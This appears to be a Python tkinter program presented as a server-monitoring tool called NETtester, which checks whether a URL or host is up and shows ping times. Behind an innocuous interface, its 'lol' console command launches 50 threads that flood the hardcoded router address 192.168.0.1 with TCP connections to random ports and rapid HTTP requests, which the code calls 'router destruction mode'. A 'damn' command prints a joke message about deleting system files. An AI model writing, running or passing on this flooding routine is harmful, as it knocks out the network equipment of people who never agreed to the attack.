import tkinter as tk
from tkinter import ttk, filedialog
import threading
import time
import socket
import random
import os
import sys
import requests
from datetime import datetime

class NETtester:
    def __init__(self, master):
        self.master = master
        master.title("NETtester")
        master.geometry("600x650")
        master.configure(bg="#003300")
        master.option_add("*Font", "Courier 10")
        
        # Variables
        self.url = tk.StringVar(value="https://server.com")
        self.port = tk.StringVar(value="80")
        self.delay = tk.StringVar(value="1000")
        self.ping_val = tk.StringVar(value="0ms")
        self.file_size = tk.StringVar(value="0kb")
        self.file_path = ""
        self.testing = False
        self.attack_mode = False
        
        # Colors
        self.bg_color = "#003300"
        self.text_color = "#00FF00"
        self.entry_bg = "#001100"
        self.bright_blue = "#0000FF"
        self.warning_color = "white"
        self.console_bg = "black"
        
        # Create UI
        self.create_widgets()
        
    def create_widgets(self):
        # ASCII Art Header
        ascii_art = """▖ ▖▄▖▄▖▗     ▗     
▛▖▌▙▖▐ ▜▘█▌▛▘▜▘█▌▛▘
▌▝▌▙▖▐ ▐▖▙▖▄▌▐▖▙▖▌ 
                   """
        header = tk.Label(self.master, text=ascii_art, fg="#00FF00", bg=self.bg_color, justify="left")
        header.pack(pady=(10, 5))
        
        # Main Content Frame
        content_frame = tk.Frame(self.master, bg=self.bg_color)
        content_frame.pack(fill="x", padx=20, pady=10)
        
        # Left Panel
        left_frame = tk.Frame(content_frame, bg=self.bg_color)
        left_frame.pack(side="left", fill="both", expand=True)
        
        # Network Section
        tk.Label(left_frame, text="Network", fg=self.bright_blue, bg=self.bg_color).pack(anchor="w")
        url_entry = tk.Entry(left_frame, textvariable=self.url, bg=self.entry_bg, fg=self.text_color, 
                            insertbackground=self.text_color, width=25)
        url_entry.pack(fill="x", pady=(0, 10))
        
        # Port Section
        tk.Label(left_frame, text="Port", fg=self.text_color, bg=self.bg_color).pack(anchor="w", pady=(10, 0))
        port_frame = tk.Frame(left_frame, bg=self.bg_color)
        port_frame.pack(fill="x")
        tk.Entry(port_frame, textvariable=self.port, bg=self.entry_bg, fg=self.text_color, 
                insertbackground=self.text_color, width=8).pack(side="left")
        tk.Label(port_frame, text="ms", fg=self.text_color, bg=self.bg_color).pack(side="left", padx=5)
        tk.Label(left_frame, text="For experienced users only, do not write anything here unless necessary", 
                fg=self.warning_color, bg=self.bg_color, font=("Courier", 8)).pack(anchor="w", pady=(0, 10))
        
        # Ping Section
        ping_frame = tk.Frame(left_frame, bg=self.bg_color)
        ping_frame.pack(fill="x", pady=(10, 0))
        tk.Label(ping_frame, text="Ping", fg=self.text_color, bg=self.bg_color).pack(side="left")
        tk.Label(ping_frame, textvariable=self.ping_val, fg="white", bg=self.bg_color).pack(side="left", padx=10)
        
        # Ping Indicators
        self.indicators = []
        indicators_frame = tk.Frame(ping_frame, bg=self.bg_color)
        indicators_frame.pack(side="left", padx=(10, 0))
        for _ in range(3):
            indicator = tk.Label(indicators_frame, text=" ", bg="black", width=2, height=1)
            indicator.pack(side="left", padx=2)
            self.indicators.append(indicator)
        
        # Right Panel
        right_frame = tk.Frame(content_frame, bg=self.bg_color)
        right_frame.pack(side="right", fill="both", expand=True)
        
        # Package Section
        tk.Label(right_frame, text="Package", fg=self.text_color, bg=self.bg_color).pack(anchor="e")
        package_frame = tk.Frame(right_frame, bg=self.bg_color)
        package_frame.pack(fill="x", anchor="e", pady=(0, 10))
        tk.Label(package_frame, textvariable=self.file_size, fg="white", bg=self.bg_color).pack(side="left", padx=5)
        tk.Button(package_frame, text="select", command=self.select_file, 
                 bg=self.entry_bg, fg=self.text_color, relief="flat").pack(side="right")
        tk.Label(right_frame, text="For experienced users only, do not write anything here unless necessary", 
                fg=self.warning_color, bg=self.bg_color, font=("Courier", 8)).pack(anchor="e", pady=(0, 10))
        
        # Delay Section
        delay_frame = tk.Frame(right_frame, bg=self.bg_color)
        delay_frame.pack(anchor="e", pady=(10, 0))
        tk.Label(delay_frame, text="Delay", fg=self.text_color, bg=self.bg_color).pack(side="left")
        tk.Entry(delay_frame, textvariable=self.delay, bg=self.entry_bg, fg=self.text_color, 
                insertbackground=self.text_color, width=8).pack(side="left", padx=5)
        tk.Label(delay_frame, text="ms", fg=self.text_color, bg=self.bg_color).pack(side="left")
        
        # ASCII Art Footer
        ascii_footer = """                          
  ::::::::::::::::::::::  
  ::::::::::::::::::::::  
  ::::::::::::::::::::::  
  ::::::::::::::::::::::  
  ::::::::::::::::::::::  
       :::::::::::::      
       :::::::::::::      
  ::::::::::::::::::::::  
  ::::::::::::::::::::::  
  ::::::::::::::::::::::  
  :::::    ::::     ::::  
  :::::    ::::     ::::  
                          """
        footer = tk.Label(self.master, text=ascii_footer, fg=self.text_color, bg=self.bg_color)
        footer.pack(pady=10)
        
        # Console
        console_frame = tk.Frame(self.master, bg=self.console_bg)
        console_frame.pack(fill="both", expand=True, padx=20, pady=(0, 10))
        
        self.console = tk.Text(console_frame, bg=self.console_bg, fg=self.text_color, 
                              insertbackground=self.text_color, state="disabled")
        self.console.pack(side="left", fill="both", expand=True, padx=(0, 2))
        
        scrollbar = ttk.Scrollbar(console_frame, command=self.console.yview)
        scrollbar.pack(side="right", fill="y")
        self.console.config(yscrollcommand=scrollbar.set)
        
        # Command Input
        input_frame = tk.Frame(console_frame, bg=self.console_bg)
        input_frame.pack(fill="x", pady=(5, 0))
        
        tk.Label(input_frame, text=">", fg=self.text_color, bg=self.console_bg).pack(side="left")
        self.cmd_entry = tk.Entry(input_frame, bg=self.console_bg, fg=self.text_color, 
                                 insertbackground=self.text_color, exportselection=0)
        self.cmd_entry.pack(side="left", fill="x", expand=True, padx=5)
        self.cmd_entry.bind("<Return>", self.process_command)
        
        # Initial message
        self.write_to_console("Welcome to NETtester v1")
    
    def write_to_console(self, message):
        self.console.config(state="normal")
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.insert("end", f"[{timestamp}] {message}\n")
        self.console.see("end")
        self.console.config(state="disabled")
    
    def select_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.file_path = file_path
            size = os.path.getsize(file_path) // 1024
            self.file_size.set(f"{size}kb")
    
    def update_ping_indicator(self, ping):
        try:
            ping_val = int(ping.rstrip("ms"))
        except:
            ping_val = 0
        
        colors = ["black"] * 3
        
        if ping_val < 100:
            colors = ["#00FF00"] * 3
        elif 100 <= ping_val < 1000:
            colors = ["#FFA500"] * 2 + ["black"]
        elif 1000 <= ping_val < 5000:
            colors = ["#FF0000"] + ["black"] * 2
        
        for i, indicator in enumerate(self.indicators):
            indicator.config(bg=colors[i] if i < len(colors) else "black")
    
    def check_server(self):
        while self.testing:
            try:
                url = self.url.get()
                start_time = time.time()
                
                if url.startswith("http"):
                    response = requests.get(url, timeout=5)
                    status = "UP" if response.status_code < 400 else "DOWN"
                else:
                    host = url.split("//")[-1].split("/")[0]
                    port = int(self.port.get()) if self.port.get().isdigit() else 80
                    with socket.create_connection((host, port), timeout=5):
                        status = "UP"
                
                ping = int((time.time() - start_time) * 1000)
                self.ping_val.set(f"{ping}ms")
                self.update_ping_indicator(f"{ping}ms")
                self.write_to_console(f"Server status: {status} | Ping: {ping}ms")
            except Exception as e:
                self.ping_val.set("TIMEOUT")
                self.update_ping_indicator("5000ms")
                self.write_to_console(f"Error: {str(e)}")
            
            time.sleep(int(self.delay.get()) / 1000)
    
    def start_testing(self):
        if not self.testing:
            self.testing = True
            threading.Thread(target=self.check_server, daemon=True).start()
            self.write_to_console("Testing started")
    
    def stop_testing(self):
        self.testing = False
        self.write_to_console("Testing stopped")
    
    def lol_attack(self):
        if self.attack_mode:
            return
            
        self.attack_mode = True
        self.write_to_console("Initiating LOL attack... RIP router!")
        
        def attack():
            target = "192.168.0.1"
            while self.attack_mode:
                try:
                    # Random port attack
                    port = random.randint(1, 65535)
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(0.5)
                        s.connect((target, port))
                except:
                    pass
                
                # HTTP flood
                try:
                    requests.get(f"http://{target}", timeout=0.5)
                except:
                    pass
                
                time.sleep(0.01)
        
        for _ in range(50):  # 50 attack threads
            threading.Thread(target=attack, daemon=True).start()
    
    def process_command(self, event):
        cmd = self.cmd_entry.get().strip().lower()
        self.cmd_entry.delete(0, "end")
        
        if not cmd:
            return
        
        self.write_to_console(f"> {cmd}")
        
        if cmd == "help":
            help_text = """
Available commands:
start - well, everything seems clear here
stop - stop testing
help - you are here
ip - show entered IP/URL
port - show current port
lol - initiate router destruction mode
damn - emergency self-destruct
kill - terminate program immediately
exit - graceful exit"""
            self.write_to_console(help_text)
        
        elif cmd == "start":
            self.start_testing()
        
        elif cmd == "stop":
            self.stop_testing()
        
        elif cmd == "ip":
            self.write_to_console(f"Current IP/URL: {self.url.get()}")
        
        elif cmd == "port":
            self.write_to_console(f"Current port: {self.port.get()}")
        
        elif cmd == "lol":
            self.lol_attack()
            self.write_to_console("LOL mode activated. Say goodbye to your router!")
        
        elif cmd == "damn":
            self.write_to_console("Self-destruct sequence initiated!")
            self.write_to_console("Deleting system files...")
            self.write_to_console("Just kidding! But consider it done in spirit.")
        
        elif cmd in ("kill", "exit"):
            self.write_to_console("Terminating program...")
            self.master.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = NETtester(root)
    root.mainloop()